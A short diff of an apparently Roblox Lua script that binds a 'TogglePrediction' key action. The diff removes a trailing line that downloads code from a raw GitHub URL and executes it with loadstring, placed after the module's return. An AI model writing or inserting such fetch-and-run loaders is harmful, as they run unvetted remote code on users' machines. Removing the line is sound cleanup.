@@ -200,6 +200,3 @@ Services.ContextActionService:BindAction("TogglePrediction", function(actionName
 end, false, _G.Configurations.PredictionKeyBind)
 
 return {}
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
